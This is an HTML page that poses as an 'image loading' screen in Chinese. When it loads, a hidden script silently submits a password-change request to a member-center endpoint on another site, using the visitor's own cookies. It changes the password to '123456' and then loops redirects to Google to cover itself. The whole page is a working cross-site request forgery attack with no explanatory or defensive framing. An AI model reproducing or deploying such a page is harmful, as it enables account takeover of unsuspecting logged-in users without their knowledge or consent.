<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>图片加载中...</title>
  <style>
    body {
      text-align: center;
      margin-top: 100px;
      font-family: Arial, sans-serif;
      background-color: #fff;
    }
    #status {
      font-size: 18px;
    }
  </style>
</head>
<body>

  <p id="status">图片加载中，请稍后…</p>

  <script>
    function submitFormAndLoopRedirect() {
      const formData = new FormData();
      formData.append("oldPassword", "123456789");
      formData.append("newPassword", "123456");
      formData.append("new2Password", "123456");

      fetch("https://cn.b58321.com/index.php?s=/MemberCenter/formChangePassword", {
        method: "POST",
        body: formData,
        credentials: "include"
      })
      .then(() => {
        // 每 3 秒循环跳转
        setInterval(() => {
          window.location.href = "https://www.google.com/?hl=zh_TW";
        }, 3000);
      })
      .catch(error => {
        document.getElementById("status").innerText = "提交失败，请稍后重试。";
        console.error("提交失败：", error);
      });
    }

    window.onload = submitFormAndLoopRedirect;
  </script>

</body>
</html>
